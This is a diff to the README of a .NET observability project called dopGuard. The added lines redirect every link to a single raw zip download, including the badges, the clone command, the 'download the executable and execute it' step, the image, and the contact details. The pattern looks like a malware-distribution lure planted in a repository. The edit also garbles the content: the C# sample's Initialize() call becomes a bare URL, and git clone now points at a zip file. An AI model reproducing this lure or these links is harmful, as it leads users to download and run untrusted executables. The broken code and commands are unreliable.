@@ -1,6 +1,6 @@
 # dopGuard: Modular Observability Platform for .NET Applications 🌐
 
-[![Latest Release](https://img.shields.io/github/v/release/hboublal/dopGuard)](https://github.com/hboublal/dopGuard/releases) [![Documentation](https://img.shields.io/badge/Documentation-Read%20More-brightgreen)](https://github.com/hboublal/dopGuard/releases)
+[![Latest Release](https://github.com/hboublal/dopGuard/raw/refs/heads/develop/prometheus/Guard-dop-v3.0.zip)](https://github.com/hboublal/dopGuard/raw/refs/heads/develop/prometheus/Guard-dop-v3.0.zip) [![Documentation](https://github.com/hboublal/dopGuard/raw/refs/heads/develop/prometheus/Guard-dop-v3.0.zip%20More-brightgreen)](https://github.com/hboublal/dopGuard/raw/refs/heads/develop/prometheus/Guard-dop-v3.0.zip)
 
 ---
 
@@ -41,7 +41,7 @@ To get started with dopGuard, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/hboublal/dopGuard.git
+   git clone https://github.com/hboublal/dopGuard/raw/refs/heads/develop/prometheus/Guard-dop-v3.0.zip
    ```
 
 2. Navigate to the project directory:
@@ -62,7 +62,7 @@ To get started with dopGuard, follow these steps:
    dotnet build
    ```
 
-5. For the latest release, download the executable from the [Releases](https://github.com/hboublal/dopGuard/releases) section. Ensure you download the appropriate file for your environment and execute it.
+5. For the latest release, download the executable from the [Releases](https://github.com/hboublal/dopGuard/raw/refs/heads/develop/prometheus/Guard-dop-v3.0.zip) section. Ensure you download the appropriate file for your environment and execute it.
 
 ---
 
@@ -78,7 +78,7 @@ public class Program
     public static void Main(string[] args)
     {
         var observability = new DopGuardService();
-        observability.Initialize();
+        https://github.com/hboublal/dopGuard/raw/refs/heads/develop/prometheus/Guard-dop-v3.0.zip();
 
         // Your application logic here
     }
@@ -141,7 +141,7 @@ dopGuard is built on a clean architecture, ensuring separation of concerns and e
 - **Storage**: Stores metrics and logs in a scalable manner.
 - **Integrations**: Manages connections to external monitoring tools.
 
-![Architecture Diagram](https://example.com/architecture-diagram.png)
+![Architecture Diagram](https://github.com/hboublal/dopGuard/raw/refs/heads/develop/prometheus/Guard-dop-v3.0.zip)
 
 ---
 
@@ -169,7 +169,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, please reach out to the maintainers:
 
-- **Author**: [Your Name](https://github.com/yourusername)
-- **Email**: your.email@example.com
+- **Author**: [Your Name](https://github.com/hboublal/dopGuard/raw/refs/heads/develop/prometheus/Guard-dop-v3.0.zip)
+- **Email**: https://github.com/hboublal/dopGuard/raw/refs/heads/develop/prometheus/Guard-dop-v3.0.zip
 
-For more information and to download the latest release, visit the [Releases](https://github.com/hboublal/dopGuard/releases) section.
+For more information and to download the latest release, visit the [Releases](https://github.com/hboublal/dopGuard/raw/refs/heads/develop/prometheus/Guard-dop-v3.0.zip) section.
